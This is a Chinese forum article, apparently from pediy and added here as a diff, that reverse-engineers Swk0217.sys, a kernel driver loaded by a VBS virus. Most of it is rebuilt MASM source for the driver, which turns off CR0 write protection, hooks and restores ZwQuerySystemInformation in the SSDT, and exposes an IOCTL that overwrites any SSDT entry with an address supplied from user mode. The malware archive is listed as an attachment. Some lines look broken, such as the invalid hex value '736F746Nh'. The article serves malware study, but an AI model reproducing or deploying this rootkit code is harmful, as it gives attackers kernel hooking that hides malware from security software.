@@ -1,0 +1,625 @@
+
+# RootKit hook 之[二] SSDT hook
+
+> 原文：[`www.pediy.com/kssd/pediy10/58199.html`](https://www.pediy.com/kssd/pediy10/58199.html)
+
+哈，好大一场雪啊，2008 年的第一场雪，比以往来得早些。外面的雪在下，透过书房的窗，欣赏着外面的雪和过往的车辆，欣赏之余，便有了想写点东西的冲动。于是便有了本篇。
+
+谈到 `ssdt hook`，先前有堕落天才的一篇文章《[SSDT Hook 的妙用－对抗 ring0 inline hook](http://bbs.pediy.com/showthread.php?p=285856#poststop)》大家如果对基本概念不了解的话，可以看看这篇文章。另外，有一篇博客上也绘声绘色的描述了它。[简单说说 SSDT](http://hi.baidu.com/hurryhx/blog/item/c9fed5b4a38d0c708bd4b28d.html)。
+
+今天我们透过一个实例看看它的应用，这个实例来源于 sudami 前面发出的一篇文章
+
+[一 VBS 病毒过 IS 和微点了,无语...](http://bbs.pediy.com/showthread.php?t=53468)，夜深人静，我便把里面的 `Swk0217.sys` 逆向来看，写得很不错。
+
+该病毒是 `vbs` 调用驱动完成的。`swk0217d` 的主要功能是：
+
+1. 获取 `ssdt` 函数个数
+2. 获取 `ssdt` 函数表中的所有函数
+3. hook `ZwQuerySystemInformation`
+4. unhook `ZwQuerySystemInformation`
+5. 根据用户给定的函数地址和 `ssdt` 表中的索引,修改 `ssdt` 表。
+
+注：
+
+1）其中在 hook `ZwQuerySystemInformation` 执行时，首先通过 `ZwQuerySystemInformation` 找出 `ntosknrl.exe` 模块的内存加载位置，然后通过 `ntosknrl.exe` 的导出表找出函数 `NtQuerySystemInformation` 的地址。然后 hook `ZwQuerySystemInformation`。各位看官，作者的主要目的是防止 `SSDT` 中该函数被挂钩，因此作者在这里做了恢复．病毒作者要使用这个函数，但是害怕这个函数已经被别人做了手脚。
+
+2）`unhook ZwQuerySystemInformation` 时，作者使用完该函数后又恢复了 `ssdt` 原有的状态。
+
+```asm
+.386
+
+.model flat,stdcall
+
+option casemap:none
+
+include w2k\ntstatus.inc
+
+include w2k\ntddk.inc
+
+include w2k\ntoskrnl.inc
+
+includelib C:\RadASM\masm32\lib\w2k\ntoskrnl.lib
+
+include Swk0207.inc
+
+.data
+
+unk_10B80 db 4Eh ; N
+          db 0E6h  ; ?
+          db 40h  ; @
+          db 0BBh  ; ?
+OldSSDTValueOfZwQuerySystemInformation dd 0
+
+.code
+
+;                  6E 74 6F 73 6B 72 6E 6C 2E 65 78 65 00 CC 6A 24  = ntoskrnl.exe,0    int3   push 24h
+
+FunctionArray dd 736F746Nh, 6C6E726Bh, 6578652Eh,246ACC00h
+
+;****************************************************************************************
+; ZwQuerySystemInformation 获取 ntoskrnl.exe 的内存加载地址
+;****************************************************************************************
+;typedef struct _SYSTEM_MODULE_INFORMATION  // Information Class 11
+;{
+;    ULONG  Reserved[2];  +0
+;    PVOID  Base;         +08h
+;    ULONG  Size;         +0ch
+;    ULONG  Flags;        +10h
+;    USHORT Index;        +14h
+;    USHORT Unknown;      +16h
+;    USHORT LoadCount;    +18h
+;    USHORT ModuleNameOffset; +1Ah
+;    CHAR   ImageName[256];   +1Ch
+;} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+;typedef NTSTATUS ( __stdcall *ZWQUERYSYSTEMINFORMATION )
+;                  ( IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+;                    IN OUT PVOID SystemInformation,
+;                    IN ULONG SystemInformationLength,
+;                    OUT PULONG ReturnLength OPTIONAL );
+;typedef struct _tagSysModuleList {
+;    ULONG ulCount;
+;    SYSTEM_MODULE_INFORMATION smi[1];
+;} SYSMODULELIST, *PSYSMODULELIST;
+;用法如下:
+;s = NtQuerySystemInformation( SystemModuleInformation, pRet,
+;sizeof( SYSMODULELIST ), &nRetSize );
+  xor  ebx, ebx
+  mov  [ebp-24h], ebx
+  mov  [ebp-4], ebx
+  lea  eax, [ebp-1Ch]
+  push  eax         ;ReturnLength
+  push  ebx         ;SystemInformationLength = 0
+  lea  eax, [ebp-20h]
+  push  eax         ;SystemInformation
+  push  0Bh         ;SystemModuleInformation,遍历模块
+  mov  esi, ZwQuerySystemInformation
+  call  esi ; ZwQuerySystemInformation ,第一次调用得到需要的缓冲区长度
+  mov  [ebp-28h], eax
+  cmp  eax, 0C0000004h
+  jnz  ERRORRET
+  push  206B6444h ;   ' kdD'标签
+  push  dword ptr [ebp-1Ch] ;申请的长度
+  push  ebx         ;NonPagedPool
+  call  ExAllocatePoolWithTag
+  mov  edi, eax
+  mov  [ebp-30h], edi   ;保留返回值
+  cmp  edi, ebx       ;判断返回值是否为空
+  jnz  NextStep
+  or  dword ptr [ebp-4], 0FFFFFFFFh
+  xor  eax, eax
+  jmp  ErrAllocMem
+NextStep:
+  lea  eax, [ebp-34h]         ;ReturnLength
+  push  eax
+  push  dword ptr [ebp-1Ch] ;SystemInformationLength
+  push  edi        ;SystemInformation
+  push  0Bh       ;SystemModuleInformation
+  call  esi        ; ZwQuerySystemInformation
+  mov  [ebp-28h], eax
+  cmp  eax, ebx
+  jl  ReleaseMemory
+  mov  eax, [edi]
+  mov  [ebp-1Ch], eax  ;保留 ZwQuerySystemInformation 返回的 SYSTEM_MODULE_INFORMATION 元素个数
+  lea  esi, [edi+4]
+  mov  [ebp-2Ch], esi  ;保留返回的 SYSTEM_MODULE_INFORMATION 数组首地址
+  mov  [ebp-20h], ebx  ;计数变量清零
+FORLOOP:
+  mov  eax, [ebp-1Ch] ;开始 for 循环
+  cmp  [ebp-20h], eax
+  jnb  ReleaseMemory
+  push  offset FunctionArray
+  ; 例如: ImageName: windows\system32\ndis.sys, 那么 ModuleNameOffset 就是 0x11
+  movzx  eax, word ptr [esi+1Ah] ;SYSTEM_MODULE_INFORMATION.ModuleNameOffset ,指向名字的偏移
+  lea  eax, [eax+esi+1Ch]  ;SYSTEM_MODULE_INFORMATION.ImageName + SYSTEM_MODULE_INFORMATION.ModuleNameOffset
+  push  eax   ;不包含路径的名字
+  call  _stricmp
+  pop  ecx      ;出栈
+  pop  ecx
+  test  eax, eax
+  jnz  ContinueLoop
+  mov  eax, [esi+8]   ;返回 SYSTEM_MODULE_INFORMATION.Base
+  mov  [ebp-24h], eax  ;返回值保存在[ebp-24h]单元
+ReleaseMemory:
+  push  edi
+  call  ExFreePool
+  jmp     ERRORRET
+ContinueLoop:
+  inc  dword ptr [ebp-20h] ;循环变量递增
+  add  esi, 11Ch          ;取下一个 SYSTEM_MODULE_INFORMATION 类型元素
+  mov  [ebp-2Ch], esi     ;暂存当前的 SYSTEM_MODULE_INFORMATION 元素
+  jmp  FORLOOP
+SehFunction     proc near
+    mov     esp, [ebp-18h]
+ERRORRET:
+    or      dword ptr [ebp-4], 0FFFFFFFFh
+    mov     eax, [ebp-24h]
+ErrAllocMem:
+    ret
+SehFunction    endp
+;****************************************************************************************
+; 相当于 GetProcessAddress 的功能, hModule 是指 ntoskrnl.exe 模块,查找该 PE 导出表,
+; 找出 pFunctionName 的函数地址.
+; 工作原理: 遍历导出表中的 AddressOfFunctions,每取出一个函数地址,都根据其在 AddressOfFunctions 中的
+;           索引,遍历整个的 AddressOfNames 表和 AddressOfNameOrdinals 表,找出序号跟 AddressOfFunctions
+;           索引相匹配的函数名,比对函数名和输入参数 2 是否相同,相同则从 AddressOfFunctions 中返回当前函数
+;           的地址,不同则继续找...
+;****************************************************************************************
+GetProcessFromNtoskrnl proc hModule:dword,FunctionName:dword
+  LOCAL AddressOfNameOrdinals:dword;函数名序号表
+  LOCAL AddressOfNames:dword       ;函数名地址表
+  LOCAL OutputTable:dword          ;导出表地址
+  LOCAL AddressOfFunctions:dword   ;指向导出函数地址表中的指针
+  LOCAL pFunctionName:dword        ;函数名
+  LOCAL i:dword                    ;循环变量
+  LOCAL CurAddressOfNameOrdinals:dword ;当前函数名序号
+  LOCAL CurAddressOfNames:dword        ;当前的函数名地址
+  LOCAL nIndex:dword                 ;循环变量
+  LOCAL myFoundOutFunctionName:dword   ;我们从函数名地址表中找出的函数名指针
+  LOCAL InputFunctionName:dword        ;输入的函数名指针,指向参数 2
+  LOCAL SecondCharacterOfFunctionName:byte
+  LOCAL FirstCharacterOfFunctionName:byte
+  mov  edx, hModule
+  mov  eax, [edx+3Ch]
+  add  eax, edx          ; 指向 PEHeader
+  cmp  word ptr [edx],  5A4Dh ; 'MZ'
+  jnz  Quit
+  cmp  dword ptr [eax], 4550h ;'PE'
+  jnz  Quit
+  mov  eax, [eax+78h]
+  add  eax, edx         ;指向导出表
+  mov  OutputTable, eax
+  mov  edi, [eax+20h] ; IMAGE_EXPORT_DIRECTORY.AddressOfNames
+  add  edi, edx
+  mov  AddressOfNames, edi
+  mov  esi, [eax+1Ch] ;IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
+  add  esi, edx
+  mov  AddressOfFunctions, esi
+  mov  ecx, [eax+24h] ;IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
+  add  ecx, edx
+```
+
+
+
+```
+mov  AddressOfNameOrdinals, ecx
+and  nIndex, 0
+mov  edx, pFunctionName
+
+StartSearch:
+  mov  ebx, nIndex
+  cmp  ebx, [eax+14h] ;IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
+  jnb  Quit
+  cmp  dword ptr [esi], 0 ;判断 AddressOfFunctions 中第一个函数地址是否为空
+  jz  NextAddressOfFunction ;如果为空,就取 IMAGE_EXPORT_DIRECTORY.AddressOfFunctions 表中的下一个函数
+  mov  CurAddressOfNames, edi
+  mov  CurAddressOfNameOrdinals, ecx
+  and  i, 0
+
+StartFindFunctionFromAddressOfNames:
+  mov  ebx, i
+  cmp  ebx, [eax+18h] ;IMAGE_EXPORT_DIRECTORY.NumberOfNames
+  jnb  OutOfRange
+  mov  ebx, CurAddressOfNameOrdinals
+  movzx  ebx, word ptr [ebx]
+  cmp  ebx, nIndex ;判断从 AddressOfFunctions 得到的序号,跟 AddressOfNameOrdinals 得到序号是否一致
+  jnz  NextAddressOfNameOrdinals
+  mov  edx, CurAddressOfNames
+  mov  edx, [edx]
+  add  edx, hModule
+  mov  pFunctionName, edx ;取出函数名
+
+OutOfRange:
+  test  edx, edx ;判断是否空
+  jz  ContinueWork
+  mov  myFoundOutFunctionName, edx ;暂存函数名
+  mov  edx, FunctionName
+  mov  InputFunctionName, edx ;暂存输入的函数名
+
+CompareFunctionName:
+  mov  edx, InputFunctionName
+  mov  dl, [edx]
+  mov  FirstCharacterOfFunctionName, dl
+  mov  ebx, myFoundOutFunctionName
+  cmp  dl, [ebx]
+  jnz  Different ;不相同
+  test dl, dl ;判断 InputFunctionName 是否为空,如果为空,就返回函数地址表中的第一个
+  jz  RetCurrentFunctionAddress
+  mov  edx, InputFunctionName ;比对函数名中的下一个字符
+  mov  dl, [edx+1]
+  mov  SecondCharacterOfFunctionName, dl
+  cmp  dl, [ebx+1]
+  jnz  Different
+  add  InputFunctionName, 2
+  add  myFoundOutFunctionName, 2
+  test  dl, dl
+  jnz   CompareFunctionName
+
+RetCurrentFunctionAddress:
+  xor  edx, edx ;edx = 0,表示找到对应的函数
+  jmp  GetFunctionAddress
+
+NextAddressOfNameOrdinals:
+  add  CurAddressOfNames, 4
+  add  CurAddressOfNameOrdinals, 2
+  inc  i
+  jmp  StartFindFunctionFromAddressOfNames
+
+Different:
+  sbb  edx, edx
+  sbb  edx, 0FFFFFFFFh ;edx = 1,表示没有找到对应的函数,继续找
+
+GetFunctionAddress:
+  test  edx, edx
+  jnz  ContinueWork
+  mov  esi, [esi]
+  add  esi, hModule
+  mov  eax, esi ;返回函数地址
+  jmp  Founded
+
+ContinueWork:
+  xor  edx, edx
+  mov  pFunctionName, edx
+
+NextAddressOfFunction:
+  add  esi, 4
+  mov  AddressOfFunctions, esi
+  inc  nIndex
+  jmp  StartSearch
+
+Quit:
+  xor  eax, eax
+
+Founded:
+  ret
+
+GetProcessFromNtoskrnl endp
+
+;****************************************************************
+
+; 给出一个索引值和一个函数地址,修改 ssdt 表
+
+;****************************************************************
+
+HookSSDTByFunIndex proc Value:dword,Index:dword
+  mov  ecx, Index
+  mov  eax, KeServiceDescriptorTable
+  cmp  ecx, [eax+8] ;NumberOfService
+  jb  @f
+  xor  al, al
+  jmp  Quit
+@@:
+  ;去掉写保护
+  push  eax
+  mov  eax, cr0
+  and  eax, 0FFFEFFFFh
+  mov  cr0, eax
+  pop  eax
+  mov  eax, KeServiceDescriptorTable
+  mov  eax, [eax]
+  mov  edx, Value; Value
+  lea  ecx, [eax+ecx*4] ; Target
+  call  InterlockedExchange
+  ;恢复写保护
+  push  eax
+  mov  eax, cr0
+  or  eax, 10000h
+  mov  cr0, eax
+  pop  eax
+
+Quit:
+  ret
+
+HookSSDTByFunIndex endp
+
+;****************************************************************
+
+; hook ZwQuerySystemInfomation,替换为 NtQuerySystemInformation ,返回值为原来的值
+
+;****************************************************************
+
+HookSSDT proc Value:dword,FunAddr:dword
+  push  eax
+  ;去掉写保护
+  mov  eax, cr0
+  and  eax, 0FFFEFFFFh
+  mov  cr0, eax
+  pop  eax
+  mov  ecx, KeServiceDescriptorTable
+  mov  eax, FunAddr
+  mov  eax, [eax+1] ;通过 ZwQuerySystemInfomation 得到 ssdt 中的 index
+  mov  ecx, [ecx] ;ServiceTableBase
+  mov  edx, Value ; Value
+  lea  ecx, [ecx+eax*4] ; Target
+  call  InterlockedExchange
+  mov  ecx, eax
+  push  eax
+  ;恢复写保护
+  mov  eax, cr0
+  or  eax, 10000h
+  mov  cr0, eax
+  pop  eax
+  mov  eax, ecx
+  ret
+
+HookSSDT endp
+
+SourceString wchar L(<\\\\DosDevices\\\\Swk0217\\0>)
+
+swkUnLoad proc pDriverObject :dword
+  LOCAL DestinationString:UNICODE_STRING
+  push  ecx
+  push  ecx
+  push  offset SourceString ; SourceString
+  lea  eax, DestinationString
+  push  eax ; DestinationString
+  call  RtlInitUnicodeString
+  lea  eax, DestinationString
+  push  eax ; SymbolicLinkName
+  call  IoDeleteSymbolicLink
+  mov  eax, pDriverObject
+  push  dword ptr [eax+4] ; DeviceObject
+  call  IoDeleteDevice
+  ret
+
+swkUnLoad endp
+
+aNtquerysystemi  db 'NtQuerySystemInformation',0
+
+DispatchFunction:
+  push  esi
+  mov  esi, [esp+0Ch] ;pIrp
+  mov  eax, [esi+60h] ;取 IRP.CurrentStackLocation
+  and  dword ptr [esi+18h], 0 ;将 IRP 中的 IoStatus 置零，这个结构体见 ntddk.inc
+  and  dword ptr [esi+1Ch], 0
+  cmp  byte ptr [eax],  0Eh ;IO_STACK_LOCATION.MajorFunction
+  mov  edx, [esi+0Ch] ;IRP.AssociatedIrp.SystemBuffer
+  mov  ecx, [eax+8] ;IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength
+  push  edi
+  jnz  CreateAndClose
+  mov  eax, [eax+0Ch] ;IoControlCode
+  cmp  eax, 83471060h
+  jz  GetSSDTNum ;获取 ssdt 函数个数
+  cmp  eax, 83471064h
+  jz  GetSSDTFunction ;获取 ssdt 函数表
+  cmp  eax, 83471068h
+  jz  HookZwQuerySystemInformation ;hook ZwQuerySystemInformation
+  cmp  eax, 8347106Ch
+  jz  RestoreHookSSDT ;恢复前面 hook 的 ZwQuerySystemInformation
+  cmp  eax, 83471070h
+  jz  ModifySSDTByFunIndex ;根据用户给定的函数地址和 ssdt 表中的索引,修改 ssdt 表
+  mov  dword ptr [esi+18h], 0C000000Dh ;IoStatus
+  jmp  CreateAndClose
+
+ModifySSDTByFunIndex:
+  push  8
+  pop  edi
+  cmp  ecx, edi ;判断 InputBufferLength 是否等于 8
+  jnz  CreateAndClose
+  push  dword ptr [edx+4] ;SystemBuffer 中第二个 dword 值,代表一个 ssdt 表中的索引
+  push  dword ptr [edx] ;SystemBuffer 中第一个 dword 值，代表一个给定的函数地址
+  call  HookSSDTByFunIndex
+  test  al, al
+  jz  CreateAndClose
+  mov  [esi+1Ch], edi
+  jmp  CreateAndClose
+
+RestoreHookSSDT: ;恢复 ssdt 表
+  mov  eax, OldSSDTValueOfZwQuerySystemInformation
+  test  eax, eax
+  jz  CreateAndClose
+  mov  ecx, ZwQuerySystemInformation
+  cmp  eax, ecx
+  jz  HaveDone
+  push  ecx
+  push  eax
+  call  HookSSDT
+
+HaveDone:
+  and  OldSSDTValueOfZwQuerySystemInformation, 0
+  jmp  CreateAndClose
+
+HookZwQuerySystemInformation:
+  call  near ptr FunctionArray+0Eh ;执行 push 24h,通过 ZwQuerySystemInformation 获取 ntoskrnl.exe 的内存加载地址
+  test  eax, eax
+  jz  CreateAndClose
+  push  offset aNtquerysystemi ; "NtQuerySystemInformation"
+  push  eax
+  call  GetProcessFromNtoskrnl
+  mov  ecx, ZwQuerySystemInformation
+  cmp  eax, ecx
+  jz  CreateAndClose
+  push  ecx
+  push  eax
+  call  HookSSDT
+  mov  OldSSDTValueOfZwQuerySystemInformation, eax ;保存原 ssdt 表中函数地址
+  jmp  CreateAndClose
+
+GetSSDTFunction:
+  mov  eax, KeServiceDescriptorTable
+  mov  edi, [eax+8] ;NumberOfService
+  push  ebx
+  mov  ebx, edi
+  shl  ebx, 2 ;NumberOfService*4
+  cmp  ecx, ebx ;比较输入长度与 NumberOfService*4,判断申请的缓冲区是否够
+  pop  ebx
+  jb  CreateAndClose
+  xor  ecx, ecx
+  test  edi, edi
+  jbe  GetSSDTFunctionErr
+
+GetNextSSDTFunction:
+  mov  eax, [eax]
+  mov  eax, [eax+ecx*4]
+  mov  [edx+ecx*4], eax
+  mov  eax, KeServiceDescriptorTable
+  inc  ecx
+  cmp  ecx, [eax+8]
+  jb  GetNextSSDTFunction
+
+GetSSDTFunctionErr:
+  mov  eax, [eax+8]
+  shl  eax, 2
+```
+
+
+
+```asm
+  jmp  Quit  
+
+GetSSDTNum:  
+
+  push  4  
+
+  pop  eax  
+
+  cmp  ecx, eax ;输入长度<4 跳转  
+
+  jb  CreateAndClose  
+
+  mov  ecx, KeServiceDescriptorTable  
+
+  mov  ecx, [ecx+8] ;NumberOfService  
+
+  mov  [edx], ecx  ;edx 指向 IRP.AssociatedIrp.SystemBuffer  
+
+Quit:  
+
+  mov  [esi+1Ch], eax  
+
+CreateAndClose:  
+
+  mov  edi, [esi+18h] ;IoStatus  
+
+  xor  dl, dl  
+
+  mov  ecx, esi  
+
+  call  IofCompleteRequest  
+
+  mov  eax, edi  
+
+  pop  edi  
+
+  pop  esi  
+
+  ret  
+
+wcharDeviceName wchar L(\\Device\\Swk0217\0)  
+
+wcharSymbolicLink wchar L(\\DosDevices\\Swk0217\0)  
+
+start proc DriverObject:dword  
+
+  LOCAL SymbolicLinkName:UNICODE_STRING  
+
+  LOCAL DestinationString:UNICODE_STRING  
+
+  LOCAL DeviceObject:dword  
+
+  and  DeviceObject, 0  
+
+  push  esi  
+
+  push  edi  
+
+  mov  edi, RtlInitUnicodeString  
+
+  push  offset wcharDeviceName ; SourceString  
+
+  lea  eax, DestinationString  
+
+  push  eax    ; DestinationString  
+
+  call  edi           ; RtlInitUnicodeString  
+
+  mov  esi, DriverObject  
+
+  lea  eax, DeviceObject  
+
+  push  eax    ; DeviceObject  
+
+  push  0    ; Exclusive  
+
+  push  0    ; DeviceCharacteristics  
+
+  push  598347h    ; DeviceType  
+
+  lea  eax, DestinationString  
+
+  push  eax    ; DeviceName  
+
+  push  0    ; DeviceExtensionSize  
+
+  push  esi    ; DriverObject  
+
+  call  IoCreateDevice  
+
+  test  eax, eax  
+
+  jl  @f  
+
+  push  offset wcharSymbolicLink ; SourceString  
+
+  lea  eax, SymbolicLinkName  
+
+  push  eax    ; DestinationString  
+
+  call  edi ; RtlInitUnicodeString  
+
+  lea  eax, DestinationString  
+
+  push  eax    ; DeviceName  
+
+  lea  eax, SymbolicLinkName  
+
+  push  eax    ; SymbolicLinkName  
+
+  call  IoCreateSymbolicLink  
+
+  mov  ecx, offset DispatchFunction  
+
+  mov  [esi+70h], ecx ;IRP_MJ_DEVICE_CONTROL  
+
+  mov  [esi+40h], ecx ;IRP_MJ_CLOSE  
+
+  mov  [esi+38h], ecx ;IRP_MJ_CREATE  
+
+  mov  dword ptr [esi+34h], offset swkUnLoad ;DriverObject.DriverUnLoad  
+
+@@:  
+
+  pop  edi  
+
+  pop  esi  
+
+  ret  
+
+start endp  
+
+end start
+```
+
+上传的附件
+
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | `swk0207.rar` |
+|---|---|
